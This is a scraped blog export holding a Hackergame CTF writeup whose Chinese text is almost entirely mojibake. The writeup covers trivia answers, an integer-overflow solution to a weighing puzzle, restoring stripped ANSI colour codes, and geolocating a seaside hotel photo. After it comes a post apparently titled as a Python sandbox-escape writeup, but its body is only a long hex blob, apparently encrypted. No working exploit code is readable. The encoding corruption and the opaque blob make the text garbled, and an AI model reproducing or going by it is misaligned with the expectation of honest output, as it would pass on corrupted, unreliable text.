å°è¯•åå¾—åˆ°ç­”æ¡ˆæ˜¯ 5 ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦ Linux ç”¨æˆ·åä¼šä½äºè¥¿åŒºå›¾ä¹¦é¦†çš„æ´»åŠ¨å®¤é—¨å£çš„ç‰Œå­ä¸Šâ€œLUG @ USTCâ€ä¸‹æ–¹çš„å°å­—æ˜¯ï¼Ÿ è¿™é¢˜ä¹Ÿç®€å•ï¼Œç›´æ¥é—®ç§‘å¤§åŒå­¦å°±å¥½äº†ï¼ˆxç¿»äº† LUG çš„å¾®ä¿¡å…¬ä¼—å·å’Œ QQ å®˜æ–¹å·ï¼Œéƒ½æ²¡å•¥æ”¶è·ï¼Œæœ€åå‘ç°å®˜ç½‘ä¸Šæœ‰ Newsã€‚è¿™æ ·çš„è¯ï¼Œå¦‚æœæ–°å¯ç”¨æ´»åŠ¨å®¤çš„è¯ï¼Œä¸€å®šä¼šæœ‰ä¸€ç¯‡æ–°é—»ç¨¿ï¼Œæœç´¢â€œå›¾ä¹¦é¦†â€å¾—åˆ°äº†ã€Œè¥¿åŒºå›¾ä¹¦é¦†æ–°æ´»åŠ¨å®¤å¯ç”¨ã€è¿™ç¯‡æ–‡ç« ï¼Œå¼€ç¯‡ç¬¬ä¸€å¼ å¤§å›¾å°±æ˜¯é—¨å£ç‰Œå­çš„ç…§ç‰‡ æ‰€ä»¥ç­”æ¡ˆæ˜¯ Development Team of Library ï¼ˆæ³¨æ„å¤§å°å†™ï¼‰ åœ¨ SIGBOVIK 2021 çš„ä¸€ç¯‡å…³äºäºŒè¿›åˆ¶ Newcomb-Benford å®šå¾‹çš„è®ºæ–‡ä¸­ï¼Œä½œè€…ä¸€å…±å±•ç¤ºäº†å¤šå°‘ä¸ªæ•°æ®é›†å¯¹å…¶ç†è®ºç»“æœè¿›è¡ŒéªŒè¯ï¼Ÿ åº”è¯¥æ²¡å¿…è¦æœè°·æ­Œå­¦æœ¯ä¹‹ç±»çš„ï¼Œç›´æ¥å¿…åº”æŸ¥ â€œSIGBOVIK Newcomb-Benfordâ€ å°±å¯ä»¥æ‰¾åˆ° SIGBOVIK çš„è¿™ä¸€ç¯‡å¤§æ–‡ç« åˆé›†ï¼Œå†æœç´¢ Newcomb å°±å¯ä»¥çœ‹åˆ°é¢˜ç›®é‡Œè¯´çš„è®ºæ–‡äº†ã€‚å…¨æ–‡ä¹Ÿä¸é•¿ï¼Œåªæœ‰å››é¡µï¼Œåä¸¤é¡µå…¨æ˜¯æ•°æ®çš„å›¾ï¼Œæ•°ä¸€ä¸‹ï¼Œä¸€å…±æœ‰13å¹… æ‰€ä»¥ç­”æ¡ˆæ˜¯ 13 ä¸ä¸¥æ ¼éµå¾ªåè®®è§„èŒƒçš„æ“ä½œç€å®ä»¤äººç”ŸåŒï¼Œå¥½åœ¨ IETF äº 2021 å¹´æˆç«‹äº† Protocol Police ä»¥ç›‘ç£å¹¶æƒ©æˆ’æ‰€æœ‰è¿èƒŒ RFC æ–‡æ¡£çš„è¡Œä¸ºä¸ªä½“ã€‚å‡å¦‚ä½ å‘ç°äº†æŸä½åŒå­¦å¯èƒ½è¿åäº†åè®®è§„èŒƒï¼Œæ ¹æ® Protocol Police ç›¸å…³æ–‡æ¡£ä¸­è§„å®šçš„ä¸¾æŠ¥æ–¹æ³•ï¼Œä½ åº”è¯¥å°†ä½ çš„ä¸¾æŠ¥ä¿¡å‘å¾€ä½•å¤„ï¼Ÿ æ²¡å•¥å¥½è¯´çš„ï¼Œç›´æ¥æŸ¥ï¼Œç­”æ¡ˆ /dev/null ç„¶åæäº¤å°±å¯ä»¥å¾—åˆ°flag å–ç“œé¢˜ç›®é‡Œæ¯”è¾ƒé‡è¦çš„è¯å°±æ˜¯ï¼š è¡¥å……è¯´æ˜ï¼šå½“ç§°çš„æ•°å­—å˜ä¸ºæµ®ç‚¹æ•°è€Œä¸æ˜¯æ•´æ•°æ—¶ï¼ŒHQ ä¸ä¼šè®¤å¯æœ€ç»ˆçš„ç§°é‡ç»“æœã€‚ é¢˜ç›®çš„ç›®çš„ä¹Ÿå¾ˆæ˜ç¡®ï¼Œç”¨ä¸€å †9å’Œä¸€å †6åŠ èµ·æ¥å¾—åˆ°20ã€‚è‚¯å®šä¸èƒ½åƒåå¼ºä¸€æ ·åŠˆç“œï¼Œæ‰€ä»¥è¾“å…¥ä¸€å®šæ˜¯æ•´æ•°é‚£å°±å¯ä»¥è€ƒè™‘æº¢å‡ºä½†æ˜¯ç»è¿‡å°è¯•ï¼Œç»™çš„æ•°å­—å¤ªå¤§ï¼Œå°±ä¼šä½¿ç»“æœæº¢å‡ºåˆ°æµ®ç‚¹æ•°ï¼Œè¿™ä¸æ˜¯æƒ³è¦çš„ï¼ˆå› ä¸ºå³ä½¿å‡‘åˆ°äº†20.0ä¹Ÿä¸æ­£ç¡®ï¼‰ é‚£å¦‚æœæ•°å­—å†å¤§å‘¢ï¼Œæ¯”å¦‚ 2000000000000000000ï¼ˆ18ä¸ª0ï¼‰ä¸ª9æ–¤çš„ç“œï¼Œå¯ä»¥å‘ç°ï¼Œè¿™æ—¶ç›´æ¥æº¢å‡ºåˆ°äº†è´Ÿæ•´å‹ -446744073709551616å†è¡¥ä¸Š 49638230412172000 ä¸ª9æ–¤çš„ç“œå°±å¯ä»¥å¾—åˆ° -3616ï¼ŒåŠ ä¸Š20å¯ä»¥è¢«6æ•´é™¤ï¼Œæ‰€ä»¥å†åŠ ä¸Š606ä¸ª6æ–¤çš„ç“œå°±å¯ä»¥å¾—åˆ° 20 æ­å–œä½ é€ƒè¿‡ä¸€åŠ«ï¼åå¼ºï½åå¼ºï¼ é€æ˜çš„æ–‡ä»¶ ä¸€ä¸ªé€æ˜çš„æ–‡ä»¶ï¼Œç”¨äºåœ¨ç»ˆç«¯ä¸­å±•ç¤ºä¸€ä¸ªäº”é¢œå…­è‰²çš„ flagã€‚ å¯èƒ½æ˜¯åœ¨ cmd.exe ç­‰åŠ£è´¨ç»ˆç«¯ä¸­è¢«é•¿æœŸä½¿ç”¨çš„åŸå› ï¼Œè¿™ä¸ªæ–‡ä»¶å¤±å»äº†ä¸€äº›é‡è¦æˆåˆ†ï¼Œå˜æˆäº†ä¸€å †ä¹±ç ï¼Œä¹Ÿä¸ä¼šå†æ˜¾ç¤ºå‡º flag äº†ã€‚ æ³¨æ„ï¼šflag å†…éƒ¨çš„å­—ç¬¦å…¨éƒ¨ä¸ºå°å†™å­—æ¯ã€‚ æ‹¿åˆ°æ–‡ä»¶ï¼Œçœ‹åˆ°é‡Œé¢å¥½å¤š [ ; m ä¹‹ç±»çš„ï¼Œå†ç»“åˆç»ˆç«¯ä¸­è¾“å‡ºå¸¦é¢œè‰²æ–‡å­—çš„ \\033[...m; ä¹‹ç±»çš„æ–¹æ³•ï¼Œä»¥åŠé¢˜ç›®ä¸­çš„ â€œå¤±å»äº†ä¸€äº›é‡è¦æˆåˆ†â€æ‰€ä»¥ç›´æ¥å°è¯•æŠŠ [ å…¨å±€æ›¿æ¢ä¸º \\033[ï¼Œç„¶åå¤åˆ¶åˆ° python ä¸­ printï¼Œå°±å¯ä»¥çœ‹åˆ°ç¥å¥‡çš„ä¸€å¹•äº†ï¼ˆå…¶å®å¹¶æ²¡å®Œå…¨åšå®Œï¼Œä½†æ˜¯å¯ä»¥å·²ç»çœ‹äº†ï¼‰ç„¶åè¯»å‡º flag å³å¯ï¼ˆå…¨æ˜¯å°å†™å­—æ¯ï¼‰ æ—…è¡Œç…§ç‰‡ ä½ çš„å­¦é•¿å†³å®šæ¥ä¸€åœºè¯´èµ°å°±èµ°çš„æ—…è¡Œã€‚é€šè¿‡ä»–å‘ç»™ä½ çš„ç…§ç‰‡æ¥çœ‹ï¼Œä»–åº”è¯¥æ˜¯åœ¨é…’åº—ä½ä¸‹äº†ã€‚ ä»ç…§ç‰‡æ¥çœ‹ï¼Œé…’åº—ä¼¼ä¹åœ¨å°åŒºçš„ä¸€æ ‹é«˜æ¥¼é‡Œï¼Œé™„è¿‘è¿˜æœ‰ä¸€å®¶ KFC åˆ†åº—ã€‚çªç„¶ï¼Œä½ æ„è¯†åˆ°ç…§ç‰‡é‡Œé€éœ²å‡ºæ¥çš„ä¿¡æ¯æ¯”è¡¨é¢ä¸Šçœ‹èµ·æ¥çš„è¦å¤šã€‚ è¯·è§‚å¯Ÿç…§ç‰‡å¹¶ç­”å¯¹å…¨éƒ¨ 5 é“é¢˜ä»¥è·å– flagã€‚æ³¨æ„ï¼šå›¾ç‰‡æœªåœ¨å…¶ä»–åœ°æ–¹å…¬å¼€å‘å¸ƒè¿‡ï¼Œä¹Ÿæœªé‡‡å–ä»»ä½•éšå†™æªæ–½ï¼ˆé€šè¿‡æ‰‹æœºæ‹æ‘„å±å¹•äº¦å¯ç­”é¢˜ï¼‰ã€‚ â€œæ‰‹æœºæ‹æ‘„å±å¹•äº¦å¯ç­”é¢˜â€ï¼Œæ‰€ä»¥ç…§ç‰‡ä¸­æ²¡æœ‰ä»»ä½•åœ°å€çš„å…ƒä¿¡æ¯ï¼Œåªèƒ½é çœ‹å›¾çº¿ç´¢ï¼šæµ·è¾¹ã€KFCã€é«˜æ¥¼ã€å¤§çŸ³å¤´ã€åœè½¦ä½ å…ˆçœ‹é‚£ä¸ªKFCï¼Œå¤§æ¦‚æ˜¯ä¸ªç½‘çº¢åº—ï¼Œæ‰€ä»¥æœç´¢ â€œç½‘çº¢ æµ·è¾¹ KFCâ€ï¼ŒæŸ¥åˆ°äº†ç§¦çš‡å²›ï¼Œè€Œä¸”ä¹Ÿæ˜¯æµ·è¾¹å†è¿›ä¸€æ­¥çœ‹åœ°å›¾å’Œè¡—æ™¯åœ°å›¾å°±å¯ä»¥ç¡®å®šåœ°ç‚¹åœ¨ ç§¦çš‡å²›æ–°æ¾³æµ·åº•ä¸–ç•Œ ç„¶åæ˜¯5ä¸ªé—®é¢˜ è¯¥ç…§ç‰‡æ‹æ‘„è€…çš„é¢æœæ–¹å‘ä¸ºï¼š æ ¹æ®åœ°å›¾ï¼Œå¯¹æ¯”ä¸€ä¸‹å°±å¯ä»¥å¾—åˆ°ï¼Œé¢æœæ–¹å‘æ˜¯ ä¸œå— è¯¥ç…§ç‰‡çš„æ‹æ‘„æ—¶é—´å¤§è‡´ä¸ºï¼š æ ¹æ®é€‰é¡¹é‡Œçš„æ—¶é—´ï¼Œä¸‹åˆæ˜¯ä¸¤ç‚¹åŠå·¦å³ï¼Œè€Œåœ¨ä¸œåŒ—çš„ä¸¤ç‚¹åŠå·¦å³å…¶å®å’Œä¸­åˆå·®ä¸å¤šï¼Œå½±å­å’Œå…‰æ¸©ä¹Ÿä¸å¤ªåƒè¿™ä¸ªæ ·å­ï¼Œæ‰€ä»¥å¯ä»¥ç¡®å®šæ—¶é—´å¤§è‡´æ˜¯ å‚æ™š è¯¥ç…§ç‰‡çš„æ‹æ‘„è€…æ‰€åœ¨æ¥¼å±‚ä¸ºï¼š ä¸å¥½ç¡®å®šï¼Œä½†æ˜¯ç­”æ¡ˆå¯ä»¥äº¤å¾ˆå¤šæ¬¡ï¼Œæ‰€ä»¥ä»9å±‚å·¦å³ä¾æ¬¡è¯•å°±å¯ä»¥äº†ï¼Œæœ€åå¾—åˆ°æ¥¼å±‚æ˜¯ 14 è¯¥ç…§ç‰‡å·¦ä¸Šè§’ KFC åˆ†åº—çš„ç”µè¯å·ç æ˜¯ï¼š ç›´æ¥ç”¨åœ°å›¾è½¯ä»¶æœ â€œç§¦çš‡å²›æ–°æ¾³ KFCâ€ å°±å¯ä»¥æŸ¥åˆ°é‚£å®¶åº—é“ºï¼Œä¹Ÿç»™äº†ç”µè¯ï¼Œæˆ–è€…æœç´¢ â€ç½‘çº¢ æµ·è¾¹ KFCâ€œ ä¹Ÿå¯ä»¥ç›´æ¥å¾—åˆ°ç”µè¯ï¼š0335-7168800 è¯¥ç…§ç‰‡å·¦ä¸Šè§’ KFC åˆ†åº—å·¦ä¾§å»ºç­‘æœ‰ä¸‰ä¸ªæ°´å¹³æ’åˆ—çš„æ±‰å­—ï¼Œå®ƒä»¬æ˜¯ï¼š é€šè¿‡è¡—æ™¯åœ°å›¾å°±å¯ä»¥çœ‹åˆ° KFC å·¦è¾¹çš„å»ºç­‘ä¸Šå†™äº† æµ·è±šé¦† çœ‹æ¥å†™äº†ä¸å°‘äº†ï¼Œå‰©ä¸‹çš„ç®€å•é¢˜æ”¾åˆ°ä¸‹ä¸€ç¯‡é‡Œ_(:Ğ·ã€âˆ )_ Reference Hackergame å›½é™…èˆªç©ºæ— çº¿ç”µé€šè®¯26ä¸ªè‹±æ–‡å­—æ¯è¯»æ³• - çŸ¥ä¹ LUG@USTC å®˜ç½‘ Wayback Machine archive.org SIGBOVIK 2021 ç™¾åº¦å…¨æ™¯åœ°å›¾ &lt; #0 #2 &gt;","link":"/p/fd872e78.html"},{"title":"ã€ŒZJUSec Writeupã€cyçš„pythonæ²™ç®±é€ƒé€¸ç³»åˆ—","text":"64cf36da832c32ee150f47182e85c12ad08e8fdc7585aba87e7caa43ef24ea022ddcd838c221edd44ce79d4382c4fb2a74a2a61c083a697ca366d8dabf906ff9cb977e2710eeea3b8665606c597245f9f66aaa8aa22b8d5b2d1684f09275090bd4b7d3188beb27c45725d276fcdcf3ae57bfa442335531788e63d75df4fcf1fcfd15e92f8112599c4866a6079026a5fa9152331f68e4abdf9025def0aa02a5b0e37c6daf00b3a2b203a9e9f2d7e9eea7f2b1dbc49486232143013cdaa01fd99c8805e6a12626f0e243fbeb22664d1a50421fca401b58c44b6886982e475810037f3e254e2dd27f0ddbe819e923f3d18b663455a9d8870cb5d49dacdcd4c4235e401da124c87617cd2e091e7d7cd1be23b33628afb1e5ea1d264473d5d9da6c36cb6bd9c3b66ffbf4dbf22f774d58451ce46a5b30390352a4e4ffa037305813298adf392ed06eccc3ad88c8381241d7e74dde7dd34270ab36bb0896f5739b9e16ce4b9b1618ce707ad0464491a72361640e3174f61d8ed93929e0747ba5ee39780bf4591c35351151103d2245eba2dfe47ee2091013013903b1e71a04a38c7e2df148c1014423b438b4ac4a77011d7f66265c25fe6323fe17aba66aede8e62406ad7419eebb351c55395a27e149c2dc0fbd3d0a1bb35e49cab3a1af15529c472c992d9cfbff7b3b3aa0f11f7c250eb6bf2af2501a0cc8fcbb2a8adf63438a959716dd2a0d42e56b87dbd4dd8fa504aa39a8f5ab0ed1402d2c9eb4b373afcea577e6a796daf15d894c7e1d358ea20b0cf15799b885472ae2e0e246bcf51932278fa4253d722610d13340f6b03e599fa8622312069f3db8f0302fc46a924f6b841364107a936c767434c9439e97e4e0b00c6fe2cb88e30c5a4fb92f8112f0fca9e321b84020a42ae30ce9d214fd30d166b0606d7db0adbb2032472d02103c1a2a6645ceeb41c7fedf420bc585c9afedbeab13edeecb4a7eecfc2dbbd672545a1b1bf6952812250a40840692d1c9d0a33e24280025191fb741711ade955dee0e2782dd0497ced9a8c288ee777ba9ae026c0558ef971458a5b6c3813f61b0d950e15bec2c955955be9379445b9a1a53f3837378cecb48d2c6e611bb7ba61343895d04e4f7604fc2e9ccb29a90777c563fdffce54329685c52e50da0dc57557b02a473cdfb64ad41e1685c1f78026f56633de036875ecb4c30d1299b9d6c9cc452909136fd146c2e240633c20abbff091923388d2fb5ad348e3bdf0c29659e37225784a463e3be36fc9c0645272edd36ee91cd71bf44016a756cf3bd0db0385743f3ef26edd1737e2220297ef9a373cbc2bb6a57f11f5e3f0abb20c14d630ec5f854d04884b5a709a77fdae8ff7d608d4f13d3ecd34d9415261d9ebceed5fe04a23e81169bc4006efa02f1322bd932c8a4a2c3fa0e7c56dc5eb41db5424648f8c7e4c81c3cc871fdbb24d292724616a00b8470fef023d148b027e0604070bcde2bfe1cf89b3c1ba242badd7f8f5932b5b961472bc5cb6ae66828462fa016f0e502f22ce878acb15ea8d164d088afd9eaa2771d4b3739cc990c4910e5e225796e1f3aceb5e280b686e960aa4f04a94b1fee8879d0d541e8ea5966ef4673bc18afdd45a28a3151bacc91a4d9c469cbaff8f570defa9357a8645c91da1565da741df9e724fe439ef456d8d485974f1bfcd17759784eb94f915fb7232dabd5f4dda27cf2949b1f1c2ce6b27f4f87b7c0d0ac89b524602d5584a2d86044302a95c0b254b044e9f50fb25592e92016c594298f15a127456811f70f370b1944545f60cca7018fbf74ba146a00c4ed58f13d3cb1ec02fd3d8a822bba47ee473bd06828848015caa8f344e4e55467bf45b938e045122d5633a5aba91020151d0446b7f17dfee313dd2c50c7694e71ab35a878b9561c893b0b128dcb54cb05307beb31c35440bddb1408e4ca5ef21c4ab6f2a8b5c1f4bee47fa39ef73b6e60f035abbd4bb498d0476bec408696975fc6f0181ecb564900f8502fb02668ab5ce427862cafe6c42d012294f8fb97158b571a44c0696edb342418af6cd9d189b7002b3a37b3aeb738ba800018c446af13a8d2da28f400293825695fdfca5e1d43217ed5ca445789bb022707fe24fb99aa07d8b4c122b21de532d610e8912161335d678d3998fba5307e3bdd24c32afb8e13eb4ab625ac48945deeeac71abf8d8c74525bb22d9832cc8f52c74829dbd8106e63a36efa52dd6470f0f13d2044c818cdbc5c01377a5b76ccbc0ae47caa036844fa3e511cede6da1fba4ccc38c46d3dc29d7e160ae43bd111f47570b875852ae8b771af6acf5ac79d7f165101f3c71768dfa73fe4a8a1f3341427b9b4170b6ea17696c93706500d7235b886c01672b421e7c238bf6216ef2ba9c77f3ae128136e4ba28662e2217cf9a6f68ff19fb73ad0b5256d8f09d8b29a80c7fb45b9f6ed859844ce0c186c64e812e59d5f84120c900d3f22c80ada37da9f5585b290c401621ac25db83be1aa574cedd74cf7ac95312376755e6045fedbca51634167f31f7780570aa5b7756e5402deb99ee3d07d8c1d26f2890bc4ca82b91933570195776ddbc75a2c1ab004111dde8ecc509bc377f446529fd5025aa320065b81f6237e68e7f2ee97ee03cb89c9b14f0458ac4834624947a08e157da874cb71e989e5403c0769e94f17e0d4b2b38a9938ec18af8d480e7d0c57badccebd4d9242f3092edf0690b6c47077a2b4797e42e4953c51d6b633a2e201e6b0a949eebc5e8d094e3a5761eac87cb3029376257080bccbfa63c360257432cb3afa31472b54d2aac7d26d4ed233783b3817add2fc1015d5019078e65148c5d363c4f52c1312c37553bde86c7bce48fc74b54e7832cca6f9971d944ecd346a9c3e8af08ed3bd0cee66c300040a8eea8c2e45c1c8ea9c98396a02cd0032af301771d10d9a828f6bd14b6b1f4e15c2d9fc767d218e5fc391946aefc11e25827284e54c478de248903908cca4ebfa4fcab0cbe8d764fab8ee6956f8648008bfc4fd0b924cf8cca7e6b01955031e8cd4391904164f5ead3e45018826d17916e521592bbc7fb150145c0450b7cb73a75f9b92a3fc3c62e31c6745c9b579244d5f731c719536016cb0f88328284d608f4f29f5612d66f985b990ee0aedf4607a7b835790cc8c13495d873abd6593c89027dc0f7c211120b1ec4933d70536c4562b5b3dafb196e5fb83422edb26628f42e283c1e2626b52bd40c6b55219e060239b667f4cb4dba5796e01db505511efe0fa597b76e82281901f11e61451d0a627cbeaec13065eef2256736032789c425d4fee058a0937e299afcb26351572a37710875e10e6d396bcff54e2286aabfda147213f75ae154a703f1be115c4f0f97c17810a4d818fb56e8ef7ae8afa7c02367bd71d24c13e3cdbb3c38da7624c4a47ba62ce5e5bcb7a0eaa9a2aa3399ab11e2becd696fdac2c23fd09e2bae8f6d658ad97be029018c5a766ed62a7e4a6405445e5135562bd143d349a765924b3a98aa02a382846d7c3620bfb8cd16a5594f47b28315b6e33a399ab88be1a2e64f9eea1031e96861b98d2bc7470450d852c86a1392a6cadfa03c91e298df8f025c2d857797a6c192bb47c6f5fdb459c58acbd4ec54b94d59131c221d39e6726c51932eadbf0c3d3d4273e5ce0648d4886fffbefcfbb8df2d07e3e2941ad1a8a24b0b89d5d7415aa0f4d06d36b1d000c37fc3ce2a2059aa67c26eada6d33b4675db37f74289750e834a513f569bfc602ebadbf21780790a2680a8ab4f878570eee3124e10e8dab2a58cd4ea88691877b3dc6f17cc9a71aedfac2d403c45688715c4fda9fb4c8895d315545adffa91e33681ed41070a9178cf958819dbe9cb2063dea92f54ff44e72f13ce2c3706f314643b13af0b7a36cd89c986a7aa1eada7567788cc0a7f563c6d20c11bfcc7d1e53c9079c21c14bebd909a7f293c1492310dc4b9f852573d8cf829c4f73dbb86d73c6c1ede361f6a4a2cb4bfd45460673c5ea258d762713d3bb2d250be1eada634203e06b68206a10878d032390e681744c13403b539855776bd5bd40bd28dac86ffcf8c6d23ecd205e615fd4d278479b5304455022bcbf77f7e795bc78b79d99e1cba24467ce2b5d6eb8967678abd7f1b39fa24e77ed53a0db55bab48db9cd1e1089d7c1e08270656dc5d6248bfd1ce85c0da80e5c291533d078d5f82f4324b1c0d203dd3daefb6d097c1532121aa740edd8e9877e9fa2c07c0048fc0f8811dbc26fbc0b986d11ec2fb581e6f2deee2203779f027c2465c34a48ea1f9195e9a84f3ad2fc7efa47aecc021360db7de6d694a33ff08f6af543668df2eb340ac91b8b8aac4a70829382d5d2a720038f4dadea12194f3c22145e0ffda57f287f60d0e17255d5e4f216b5270a58dc8a3ef216d93c4322e8020871d14bb46a8892612a7e8d0f81c42f736fc49cdd5194e85e2cf9b2b18fdc841e447aa8b7d9a1a2b942fd1a29b28ebd91cee582a51720c2785935b08b4398a6d521de619fb51905e4aa3174821d6ee6b225412526c8b196d498d576a51879d47184afac4feec7ffb1022298bacf0f3f26519ef379db70326f37e68b0b343967d3595660cf310614fcc077b573644e578ec2010c8a79b7832047361d55e699e0eb87503a1ceed840b9dd8c0b2a82eb0fba42564efe136ff3c98951885e655b1172d0cc68b376ba50c89b285b16b0a878aaca8b699617a0aa08af55173270648dae074363e790e7f9fe169613bc66296403231a84d97d428696c3fb10a14dbe42941463b144d3d7266fc69adb37c9923cf68b29301e101c547725ed068bdeb378027119bbb2f99a0fad44e6537b99309d0264016a89b77091314ae0486f30b88280679c7ecd4ae41424b0d4ecf482358bb2ecfa0f0739cde518df02d352d2e5f7b12229eecbbcf78e6523c8596f49faada419203361b34778261c2b99f0f2cbe0981080e86b1e150dbad65c43a8b0c19b7fe290dfde1fe647b6d148b89a7ce1ecb3206029a373cdf5075a415467f4b28d989cffe518517d11469775ed5088f34ab82ef6312babf892b5674f227f9cb7b0a692b0799ceb18f765074c35bfb489a01ddb3dfd40856e6fa7d14fe6d81aae5f4b053b2b13f7bb06e143fe148937438314b9e28369ef750ba9964face3426eacf25af301ebfc22dbd29e2a084a74c813acafa71bac015a2769deaa5dedce86f22a0c59a4ba72003e08087bc6e188a379d2bd4518b68dd0ec5654913ca8a5a014dd40b4a410d4f37e69a973343c7ee46bb1be5e856351b4decdc13d07e47b06b3c34ab3f808ab16dedd877b64bd95e2c9c414e8de0a1f3fa21f2af0657f5b3309bee876341fbcdbd36c7af97065df3efe2931ddc9e9552962759839c9ed6e25a51547019aa599c178a866bc2558f2ac83be1c01bf2174908fddd14559b871719065d101d4aeb7de3b0b4d5139037ad90e77cc349e0cfe8dfdf41d6842fd6b8ea1120c356f9fc7be1029054ef0d6ebaa69b3496473c12c0448fd471f07eacaf51fba7f7492f370ef7f2b083834f239aed640818406fcc7b0c3736716eac114369e9f30637fb1dea243c69ceffe680c17f9551c752f7c37638104dca0099d78f4b5ce6fa1737941fd5e86dc855ad18413ff071e0ff189e1d2cc571582080c6b79a1d2cff5c410c51d93b0c420f75eb174eb3193878012d32a88c1e7e31aeefd6bd531d0dfca26c2f5c28feb466b19826979d9f2003fc8b02b3d933b6c55cc964931ab719da7b5a40b7845080c3937f654a76a254108b0dd3236fda765425f1defe8681f85f4f1ca7a1cca7b3376cf209ed39cc816c6877de7b1735ac8d7720ab4b7306bdab173b054dea72a8d476917c42146bcc6cabda590845c4aaf9a8dd260c335ac4e131c2ebdf525c325c0441334d566b7043a19611174ecb4a9ad176da44c767bd721d0c711a28247bc0d239780a831e929d226e2221856e2cc95779416813fa4a5018376d0eb90d9ea6b18d74b49dbf6ffbb84cdd97006fdb2c737fbb2a9af1333e33f75dbf5d3d75bfc560dcdf33a0396448e2b02830eb12beb779c67f335450f81656ef918b31b0302ab36c351185cbeb58fc0fc407bf0f8dc52c493592c39759face76737532daccbb18740d2d7d00a59fee0c46ef14c91daf7da7a6dde41af5cb6f675593736b64c68701d2bef803aec42e7d6a85f7b9adc17b59707ea2d05907858e381c4ba61271a70be961958693dfcfd043d5b3ed8037b546180f9d1662c74b6dcdc447c4c9113a37e8088bd3e8cd21399d46430150b9b0aa8f5471f6fa5669bcbfdc7580d2e71522b03ee9d397e0bc7fd9ca72abb7ab55df725221135a04bb29222972dc5a8ae35d90b08def2b3c67b8f3b0192bdf6daed7fbd76a94410cc980cb4b2d2129ae81738323e360c81545d8e547157adada64a7499cf3f3c795d3d84a3efbfbd71d7529695c985dd66caa499824b124c6ca48f3e93cd50daaa0f578b14d45b3396328fdf0b1e3b8367244b625307bccbc7f4912c8185a46be1d5e7117fed40ef4f128033324d24e03457f01e4a32989fe06a2b88bf565a1937b32530dd93be7ddee230cae93ad5293278b74e50abd3997849ae6919077ad43338f72b0dbd1c9a47b87e854addc17ca4fbba4faa68444c6938a14f52386a47124720666eb6ad54eb18079b270c4ed3cb6c068aac39bd8fefec97abb5ebacef348dd9ed938ce1737f3e24ad1c2d6ee7e1ca152d3c215c6d3ec13cb6fa5ce849bb254fd3a48a7ab29d3aa987f8d8a66b628136dbb226901677b856d6e52145b52df4699f8c9954aa9d92a975e71a8b9bf2bdb5df577f7726f597c1c8d344ed118410afc774e87b5b424583e39b28d58eb407d1f55b294052918ed6f8d2b5726f4e5acc460e07174343329f649f50e95470d9e477882d44df5cf24afb262bcebe9859af7b666325c4e9d08db9104b31b4718d79cf92573d7afb3d967f669ccae89d6c8d4552cbdb08183f00fa6ffc8f9f2056da4bcf66cd0604d79693d878d071fec15a1575524e46cbd2ffa664cf2f89df38c59b2f1906018cdb6ad7b156644f4fd99ef9efafff57f38cc87abc89574dbd36f1607d7d3181f18dd6b3efdf633b866b9ecb9588710acfc60de6a5d204e734a7bdbebffe410fb8024f0af2a7037020ce6451c4ec78b3cea09c39dccd1df6e88c39208e5b92ac739cffdb3ccb2db497b08757a4a307a9a87e78d3a49d0ac1172d9f7f281f487f85415e7396c3266f9269aa69eefbd5018ba9b1664d014e1bc368ae34f340e100377eecef40ce75f5ad6effa8716e579c2487b4d4e31da02d9937f1dd577b021b629f9ff335b06e875988e5df3221f0168e6b133295325970cc1c3c6af6c551b4be96b1a1fbcc8897626a47a7c166765a18628807f734e928fb4a42972bdf0596ba5dc3f4b51dffd2005eaba5498d44808916d3fbb1694e3610e65b6eeaff10ed3889a08b7ad62ecdde84ecd2a3b744492e842452e75f849de5fbba6faf80e308af9bdfe40def2b24a9f3c63811b2de74703c7b7c9c5c51e743361d8627639209b98986e6f2e5b739c6c31a1286870427ec29a3e7b088f0295145d3bced9e470db2e74d5b463395aa3647e7f4623ff7a6753bebef8cf41a30f0849b9eca72a196423f8f8aadbd97ed8535107e02396ade40a221cb2fdbca6654fe9f768002e0f27e4e6cb8821a64065456e200c878f1db4d79e7860d36ae02e8a9cb08226f07ed49b44537496655cd928ca2662a506dd570b6ca73522ede562a4a1be04b906f686ff32d0ed50f1abff3b12b85a5bf00f9706845ecbde3523f0250e8b00d8cf276ac84578c31df9ff945db2a33afdedffe6845030b8eea95e78ebe8ee433264ec765a6451e83d8afef00046e0373d348518ce54d46e88669cc3bad2f10fd97a8ead3d3dc8cf80a9c1db43d92ddaa148bb06007fe1e6fb24a144c959b1ef083d3f3b4eaa2ec523a90a5521081f61a421b46074fde18f860671347c08533def30914de7bf29125b86bae9782ffe588581fcd7ad308475e709e1d0873ea0de9192ae46b2c4f5a5c26a109aa07fa5d7c5ce29183c12dbd6b5b1736f5fb25c7cd1390ab5ef017a433779a1ffc0472851e4a58963a6a5cd34614651384f3e04e49d3b2ef8d45d6dd7ca852cb3db9cf2bd3bd0f7da4643accca6f68848672de5810e53035fab6eba9be9b0f56d467a669eb1cdb7938fba77ea401a95166e8f45dcd8a23617dc42a47070d36bac5f243f3e04eb2c0b8e62d784cc5a40f45e6081de530726a724bcda48753632f303bedcca10ebcabe89ad2612ad7249275355ddc90d7420c6c76d028bc62155debf15a02b72f4cd7b114d4ceab59f93f58856ffee01ffd29d7e957ea3e4c929c33395a69f7e39f05010e93673ebfec203f97bb0f52cf28172a30d6c5010c8c655bacb40314e10da58ec3fc722651469772fd48a77b96be2b8683e56ece4c2105ba8a02366832303b0b49569cafa65510da2b0d98bb95dee0d3c19a1c339597aa1e91e559f8a6eeff43fdfad248b493cf1532669ed765044340a7c907f4bb28002323ee079eedf2b06aead5aa034de4b1834547d2b51909ba1700f2a0e367c5522a1605da5119c95edb8af56ccd8dcf6fe903ebba48ab4703bea682ef42835ce1f54f44f24e13861c2e82553f4460a8b00b4469a715d59fa4f7fb4a1b028766fcf4e48e985df8527b7735a8c98f609764f2d9b304fec6360a0a5bfda8424d48fbb25a4e0d56131879640484a77a7985bcd6475c861850397da50144eb5c0c1a9080212a99122b2ee68e337623b94f84b9056476fa4d64d549389a9467406650c09571b4d30f2e024eff9be35f006aa770d89df4ab5a5f54655673c654a02898a36bd1717a4cd06e77e01bb1fe67bb69d644b8e06b81685438d3a17c85ad29f42e4c85fbbd0f461fab0b854ddad4216a81cbaae93d64e0dc76f66b096b5fc0a89c766ec0afbb2b013b5f0c502517c9a1ae612a2f46db22fee046e0e16e317c7bf200572221f7deadc59f30595b75624ae5c54039f25e85761f2511f5695319a2fdf06832d1db76dda9b38f5ea8a3e5b493d83a1b76ef89b8c202573e71feb99b68d08860914ad47977184624c33ba6a756c92815e934a20a337c8d426949675d24b3c590aa915e7ef06bc66a8f31f0a6d0b9b20e